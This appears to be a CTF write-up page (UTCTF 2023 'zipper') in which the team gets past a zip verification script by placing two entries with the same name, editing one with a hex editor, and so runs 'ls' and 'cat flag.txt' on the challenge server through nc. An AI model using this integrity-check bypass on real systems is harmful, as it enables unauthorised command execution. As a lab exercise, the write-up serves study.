@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+	<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+	<title>RiceSec</title>
+
+	<link href="/writeups/css/prism-one-light.css" rel="stylesheet" />
+	<link rel="stylesheet" href="/writeups/css/style.css" />
+</head>
+
+
+	<body>
+		
+<header>
+	<nav>
+		<b>RiceSec</b>
+	</nav>
+</header>
+
+<h1>zipper</h1>
+
+<p>Since the verification script checks the md5 hash of the first file with a given name, we figured we might want to have multiple files with the same name in the zip.</p>
+<pre><code>commands
+├── c0mmand.txt
+├── command.txt
+└── README.md
+</code></pre>
+<pre><code>$ cat commands/c0mmand.txt
+ls
+</code></pre>
+<pre><code>$ zip commands.zip commands/*
+updating: commands/command.txt (stored 0%)
+updating: commands/README.md (deflated 20%)
+  adding: commands/c0mmand.txt (stored 0%)
+</code></pre>
+<p>Next, we replaced the two instances of <code>c0mmand</code> in the zip file with <code>command</code> in a hex editor.</p>
+<img alt="Replacing `0`s with `o`s" src="/writeups/2023/utctf/media/c0mmand.png" width="600" />
+<pre><code>echo (base64 -w 0 commands.zip) | nc betta.utctf.live 12748
+</code></pre>
+<p>Upon submitting this to the server, we found that the directory contained a <code>flag.txt</code>. We then repeated this process, changing the contents of <code>c0mmand.txt</code> to <code>cat flag.txt</code></p>
+<pre><code>$ echo (base64 -w 0 commands.zip) | nc betta.utctf.live 12748
+utflag{https://youtu.be/bZe5J8SVCYQ}
+</code></pre>
+
+
+
+	</body>
+</html>
